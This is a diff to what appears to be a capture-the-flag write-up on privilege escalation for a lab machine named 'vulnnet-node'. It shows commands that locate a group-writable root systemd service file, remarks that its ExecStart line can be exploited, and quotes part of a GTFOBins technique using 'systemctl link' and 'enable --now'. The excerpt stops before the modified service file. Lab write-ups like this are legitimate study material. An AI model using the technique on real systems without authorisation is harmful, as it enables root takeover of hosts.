@@ -203,14 +203,15 @@ WE CAN SEE THAT WE CAN MODIFY THIS FILE
 
 serv-manage@vulnnet-node:/dev/shm$ 
 
-WE CAN SEE THE 'unit' PARAMTER WHICH IS THE SERVICE THAT WILL RUN
+WE CAN SEE THE 'unit' PARAMTER(in the vulnnet-auto.timer file) WHICH IS THE SERVICE THAT WILL RUN
 
 serv-manage@vulnnet-node:/dev/shm$ locate vulnnet-job.service
 /etc/systemd/system/vulnnet-job.service
 serv-manage@vulnnet-node:/dev/shm$ ls -la /etc/systemd/system/vulnnet-job.service
 -rw-rw-r-- 1 root serv-manage 197 Jan 24 21:40 /etc/systemd/system/vulnnet-job.service
 
-THIS FILE IS ALSO WRITABLE
+THIS FILE IS ALSO WRITABLE:
+================================================================================
 [Unit]
 Description=Logs system statistics to the systemd journal
 Wants=vulnnet-auto.timer
@@ -222,10 +223,8 @@ ExecStart=/bin/df
 
 [Install]
 WantedBy=multi-user.target
-
+================================================================================
 THIS "ExecStart" Parameter can be exploited
-
-
 
 LETS CHECK GTFOBINS
 
@@ -238,7 +237,7 @@ WantedBy=multi-user.target' > $TF
 sudo systemctl link $TF
 sudo systemctl enable --now $TF
 
-LETS ADD THESE COMMAND INTO THIS FILE:
+LETS ADD THESE COMMAND INTO THIS FILE(using the same concept):
 ==============================================================================================
 [Unit]
 Description=Logs system statistics to the systemd journal
